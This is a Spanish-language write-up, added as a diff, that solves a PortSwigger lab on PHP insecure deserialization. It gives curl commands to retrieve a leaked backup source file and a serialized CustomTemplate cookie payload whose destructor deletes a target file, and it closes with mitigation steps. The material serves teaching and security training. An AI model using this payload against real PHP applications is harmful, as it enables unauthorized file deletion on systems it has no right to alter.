@@ -1,0 +1,197 @@
+---
+title: "Inyección Arbitraria de Objetos en PHP (Deserialización Insegura)"
+description: "Cómo explotar la deserialización insegura de PHP para inyectar objetos arbitrarios y activar métodos mágicos para la eliminación remota de archivos."
+labUrl: "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php"
+category: "Inyección de Objetos (PHP)"
+date: "2025-02-22"
+portswiggerDescription: "Este lab utiliza un mecanismo de sesión basado en serialización y es vulnerable a inyección arbitraria de objetos como resultado. Para resolver el lab, crea e inyecta un objeto serializado malicioso para eliminar el archivo `morale.txt` del directorio home de Carlos. Necesitarás obtener acceso al código fuente para resolver este lab. Puedes iniciar sesión con tus propias credenciales: `wiener:peter`"
+lang: "es"
+---
+
+import CollapsiblePartial from '../../../components/CollapsiblePartial.astro';
+import PartialContainer from '../../../components/PartialContainer.astro';
+
+## Conceptos Previos Necesarios Para Resolver El Lab
+
+<PartialContainer>
+  <CollapsiblePartial partial="php-serialization" title="Entendiendo la Serialización PHP" lang="es" />
+  <CollapsiblePartial partial="php-magic-methods" title="Métodos Mágicos de PHP" lang="es" />
+  <CollapsiblePartial partial="backup-files" title="Archivos de Respaldo y Fugas de Código Fuente" lang="es" />
+</PartialContainer>
+
+## Resolución
+
+Primero exploremos el lab e iniciemos sesión para obtener una cookie de sesión válida:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/login" | cat
+```
+
+> **Desglose del comando**: \
+`-s` = modo silencioso (sin barra de progreso) \
+`| cat` = redirigir la respuesta a mi [comando cat personalizado](https://github.com/echoesofwhoami/echoes-bat-theme) para una visualización con estilo
+
+La página de login tiene un formulario simple sin token CSRF:
+
+![Login Form Screenshot](/CurlSwiggerLabs/images/deserialization-arbitrary-object-injection-in-php/01_login_form.png)
+
+También hay un comentario HTML interesante al final de la página:
+
+```html
+<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
+```
+
+Esto sugiere un archivo PHP que podría ser interesante. Primero iniciemos sesión:
+
+```bash
+curl -s -D - "https://<lab-url>.web-security-academy.net/login" \
+  -d "username=wiener&password=peter" 2>/dev/null | head -10
+```
+
+> **Desglose del comando**: \
+`-D -` = mostrar cabeceras de respuesta en stdout \
+`-d "username=wiener&password=peter"` = enviar datos POST (automáticamente establece el método a POST y Content-Type a application/x-www-form-urlencoded)
+
+Respuesta:
+
+```
+HTTP/2 302
+location: /my-account?id=wiener
+set-cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4cWlsb2F0eTZncTBiczZjNnl1NHBwNGZjYmY2dXEzdiI7fQ%3d%3d; Secure; HttpOnly; SameSite=None
+```
+
+La cookie de sesión parece ser base64. Vamos a decodificarla:
+
+```bash
+echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4cWlsb2F0eTZncTBiczZjNnl1NHBwNGZjYmY2dXEzdiI7fQ==" | base64 -d
+```
+
+Salida:
+
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xqiloaty6gq0bs6c6yu4pp4fcbf6uq3v";}
+```
+
+Este es un **objeto PHP serializado**. El servidor almacena el objeto User completo en la cookie de sesión. Esto significa que controlamos lo que se deserializa en el servidor, lo que puede ser una vulnerabilidad crítica.
+
+Ahora investiguemos ese archivo `CustomTemplate.php` que encontramos en el comentario HTML. Solicitar el archivo PHP directamente simplemente lo ejecutaría, pero podemos intentar obtener el archivo de respaldo añadiendo una tilde (`~`):
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/libs/CustomTemplate.php~" | cat
+```
+
+Respuesta:
+
+```php
+<?php
+
+class CustomTemplate {
+    private $template_file_path;
+    private $lock_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+        $this->lock_file_path = $template_file_path . ".lock";
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this->lock_file_path);
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lock_file_path, "") === false) {
+                throw new Exception("Could not write to " . $this->lock_file_path);
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        if (file_exists($this->lock_file_path)) {
+            unlink($this->lock_file_path);
+        }
+    }
+}
+```
+
+Carlos va a lamentar su idea de usar el método mágico `__destruct()`. \
+Analicemos el papel de este fragmento de código en nuestro ataque:
+
+```php
+function __destruct() {
+    // Carlos thought this would be a good idea
+    if (file_exists($this->lock_file_path)) {
+        unlink($this->lock_file_path);
+    }
+}
+```
+
+Cuando un objeto `CustomTemplate` es destruido, llama a `unlink()` sobre cualquier ruta almacenada en `$this->lock_file_path`. La función `unlink()` en PHP **elimina un archivo**. Si podemos controlar `lock_file_path`, podemos eliminar cualquier archivo del servidor.
+
+**El plan de ataque:**
+
+1. Crear un objeto `CustomTemplate` serializado con `lock_file_path` apuntando a `/home/carlos/morale.txt`
+2. Codificarlo en Base64 (para coincidir con el formato de la cookie de sesión)
+3. Enviarlo como cookie de sesión
+4. Cuando PHP deserialice la cookie, crea nuestro objeto `CustomTemplate`
+5. Cuando la petición termina, el garbage collector de PHP activa `__destruct()`
+6. `__destruct()` llama a `unlink("/home/carlos/morale.txt")` — eliminando el archivo
+
+Creemos el payload serializado:
+
+```
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
+
+Desglose:
+- `O:14:"CustomTemplate"` — Objeto de la clase **CustomTemplate** (14 caracteres)
+- `:1:` — con **1** propiedad
+- `s:14:"lock_file_path"` — nombre de propiedad string **lock_file_path** (14 caracteres)
+- `s:23:"/home/carlos/morale.txt"` — valor string **/home/carlos/morale.txt** (23 caracteres)
+
+Ahora codifiquémoslo en base64:
+
+```bash
+echo -n 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}' | base64 -w0
+```
+
+> **Desglose del comando**: \
+`echo -n` = imprimir sin salto de línea final (importante para una codificación base64 limpia) \
+`base64 -w0` = codificar en base64 sin saltos de línea
+
+Salida:
+
+```
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
+```
+
+Ahora enviemos la petición con nuestra cookie de sesión maliciosa:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/my-account?id=wiener" \
+  -b "session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d"
+```
+
+> **Desglose del comando**: \
+`-b "session=..."` = enviar una cookie con la petición. Esto reemplaza la cookie de sesión legítima con nuestro objeto serializado malicioso \
+`%3d%3d` = `==` codificado en URL (los caracteres de padding base64 necesitan ser codificados en URL en las cookies)
+
+El servidor devuelve un `500 Internal Server Error` — lo cual es esperado. El servidor intentó usar nuestro objeto `CustomTemplate` como un objeto `User` y falló. Pero eso no importa: para cuando se lanza el error, PHP ya ha deserializado nuestro objeto y cuando el script termina, `__destruct()` se activa y elimina el archivo.
+
+**El archivo de Carlos ha sido incinerado mediante un ataque de deserialización insegura de objetos PHP, cumpliendo el objetivo del lab.**
+
+## Mitigación
+
+1. **Nunca deserializar datos no confiables**: Evita usar `unserialize()` con entrada controlada por el usuario. Usa formatos más seguros como JSON (`json_encode`/`json_decode`) para datos de sesión
+2. **Usar sesiones firmadas/cifradas**: Si debes serializar datos de sesión, fírmalos con HMAC o cífralos para que se detecte la manipulación
+3. **Almacenamiento de sesión del lado del servidor**: Almacena los datos de sesión en el servidor (archivos, base de datos, Redis) y solo dale al cliente un ID de sesión opaco
+4. **Eliminar archivos de respaldo**: Asegúrate de que los archivos de respaldo del editor (`~`, `.bak`, `.swp`) nunca se desplieguen en producción. Añadir la regex adecuada para cada uno, ej.: `.*~` al `.gitignore` es una forma rápida y fácil de prevenir que se hagan commit, pero más importante es configurar el servidor web para bloquear el acceso a ellos
+5. **Auditar métodos mágicos**: Revisa `__destruct()`, `__wakeup()` y otros métodos mágicos en busca de operaciones peligrosas como eliminación de archivos, ejecución de comandos o consultas a bases de datos
